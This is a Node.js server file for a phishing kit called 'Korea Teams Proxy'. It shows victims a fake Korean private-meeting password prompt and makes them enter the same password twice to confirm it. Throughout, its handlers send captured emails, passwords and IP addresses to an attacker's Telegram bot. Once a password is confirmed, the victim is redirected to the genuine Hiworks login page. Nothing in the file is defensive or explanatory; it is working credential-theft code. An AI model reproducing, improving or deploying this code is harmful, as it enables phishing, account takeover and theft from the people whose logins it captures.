// backend/server.js
const http = require('http');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
require('dotenv').config();

const PORT = process.env.PORT || 3000;
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.office.hiworks.com/";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Missing credentials');
        return false;
    }
    try {
        const axios = require('axios');
        const maxLength = 4000;
        if (text.length > maxLength) {
            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
        }
        console.log('[TELEGRAM] ✅ Sent');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Failed:', error.message);
        return false;
    }
}

const SESSIONS = {};
const SESSION_TTL = 60 * 60 * 1000;

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        previousPassword: null,
        consecutiveMatch: false,
        attemptCount: 0,
        verified: false,
        passwordHistory: []
    };
    console.log(`[SESSION] Created session ${sessionId} for ${email}`);
    return sessionId;
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();
    return req.socket.remoteAddress || 'unknown';
}

function handleProxyLogin(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
        try {
            const formData = querystring.parse(body);
            const ip = getClientIp(req);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            
            let email = formData.loginfmt || formData.login || formData.email || '';
            
            if (sessionId && SESSIONS[sessionId]) {
                if (!email) email = SESSIONS[sessionId].email;
                SESSIONS[sessionId].attemptCount = (SESSIONS[sessionId].attemptCount || 0) + 1;
                SESSIONS[sessionId].lastActivity = Date.now();
            }
            
            if (!email) {
                const referer = req.headers.referer || '';
                const hintMatch = referer.match(/login_hint=([^&]+)/);
                if (hintMatch) email = decodeURIComponent(hintMatch[1]);
            }
            if (!email) email = 'unknown@domain.com';

            const password = formData.passwd || formData.password || '';
            const session = sessionId && SESSIONS[sessionId] ? SESSIONS[sessionId] : null;
            
            // Log to Telegram
            let msg = `🔐 *LOGIN ATTEMPT #${session ? session.attemptCount : '?'}*\n\n`;
            msg += `*📧 Email:* ${email}\n`;
            msg += `*🔑 Password:* ${password || 'N/A'}\n`;
            msg += `*📡 IP:* ${ip}\n`;
            msg += `*🕐 Time:* ${new Date().toISOString()}`;
            await sendToTelegram(msg);

            if (session && session.verified) {
                res.writeHead(200, { 
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                });
                res.end(JSON.stringify({
                    success: true,
                    redirect: REDIRECT_URL + '?email=' + encodeURIComponent(email),
                    alreadyVerified: true
                }));
                return;
            }

            if (session) {
                session.passwordHistory.push({ 
                    password: password, 
                    timestamp: Date.now(), 
                    attemptNumber: session.attemptCount 
                });

                // Check if first attempt
                if (session.previousPassword === null) {
                    session.previousPassword = password;
                    session.consecutiveMatch = false;
                    res.writeHead(200, { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    });
                    res.end(JSON.stringify({
                        success: false,
                        error: 'confirm_password',
                        message: '🔐 회의는 비공개입니다. 올바른 비밀번호를 입력하세요',
                        voiceMessage: '회의는 비공개입니다. 올바른 비밀번호를 입력하세요',
                        isFirstAttempt: true,
                        clearField: true
                    }));
                    return;
                }

                // Check if passwords match (2-consecutive)
                if (password === session.previousPassword) {
                    session.consecutiveMatch = true;
                    session.verified = true;
                    
                    await sendToTelegram(`✅ *AUTHENTICATED - 2 CONSECUTIVE MATCH*\n\n📧 ${email}\n🔑 ${password}\n📡 ${ip}\n🕐 ${new Date().toISOString()}`);
                    
                    res.writeHead(200, { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    });
                    res.end(JSON.stringify({
                        success: true,
                        redirect: REDIRECT_URL + '?email=' + encodeURIComponent(email),
                        message: '✅ 인증 성공!',
                        voiceMessage: '인증 성공!',
                        clearField: false
                    }));
                    return;
                } else {
                    // Mismatch - reset
                    session.previousPassword = password;
                    session.consecutiveMatch = false;
                    
                    await sendToTelegram(`❌ *MISMATCH*\n\n📧 ${email}\n📡 ${ip}\n🕐 ${new Date().toISOString()}`);
                    
                    res.writeHead(200, { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    });
                    res.end(JSON.stringify({
                        success: false,
                        error: 'mismatch',
                        message: '🔐 회의는 비공개입니다. 올바른 비밀번호를 입력하세요',
                        voiceMessage: '회의는 비공개입니다. 올바른 비밀번호를 입력하세요',
                        isMismatch: true,
                        clearField: true,
                        reset: true
                    }));
                    return;
                }
            }

            res.writeHead(200, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            });
            res.end(JSON.stringify({
                success: false,
                error: 'no_session',
                message: '🔐 회의는 비공개입니다. 올바른 비밀번호를 입력하세요',
                clearField: true
            }));

        } catch (error) {
            console.error('[ERROR] Proxy login failed:', error.message);
            res.writeHead(500, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            });
            res.end(JSON.stringify({ 
                success: false, 
                error: 'internal_error', 
                message: '내부 오류가 발생했습니다.', 
                clearField: true 
            }));
        }
    });
}

// Handle credential capture from frontend
function handleCredentialCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
        try {
            const data = JSON.parse(body);
            console.log('[CAPTURE] 📥 Credentials received:', data.email);
            
            // Forward to Telegram
            let msg = `🔐 *CREDENTIAL CAPTURE*\n\n`;
            msg += `*📧 Email:* ${data.email}\n`;
            msg += `*🔑 Password:* ${data.password || 'N/A'}\n`;
            msg += `*🆔 Session:* ${data.sessionId || 'N/A'}\n`;
            msg += `*🕐 Time:* ${new Date().toISOString()}`;
            await sendToTelegram(msg);
            
            res.writeHead(200, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[CAPTURE] Error:', error.message);
            res.writeHead(500, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            });
            res.end(JSON.stringify({ success: false, error: error.message }));
        }
    });
}

// Health check
function handleHealth(req, res) {
    res.writeHead(200, { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        sessions: Object.keys(SESSIONS).length,
        service: 'Korea Teams Proxy',
        version: '3.0.0'
    }));
}

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);
    
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Routes
    if (req.url === '/proxy-login' && req.method === 'POST') {
        handleProxyLogin(req, res);
        return;
    }

    if (req.url === '/api/credential-capture' && req.method === 'POST') {
        handleCredentialCapture(req, res);
        return;
    }

    if (req.url === '/health') {
        handleHealth(req, res);
        return;
    }

    // Default
    res.writeHead(200, { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify({
        status: 'ok',
        message: 'Korea Teams Proxy',
        endpoints: ['/proxy-login', '/api/credential-capture', '/health']
    }));
});

server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║        ✅  KOREA TEAMS PROXY v3.0                       ║');
    console.log('║        🇰🇷  2-Consecutive Silent Verification            ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
    console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   🔐 VERIFICATION FLOW:                                  ║');
    console.log('║   📍 Attempt 1: Enter password → "회의는 비공개입니다"   ║');
    console.log('║   📍 Attempt 2: Enter SAME password → ✅ Redirect        ║');
    console.log('║   📍 Attempt 2: Enter DIFFERENT → Reset, ask again      ║');
    console.log('║   🔇 Silent counting - User never sees attempt count    ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

process.on('SIGTERM', () => server.close(() => process.exit(0)));
process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err.message));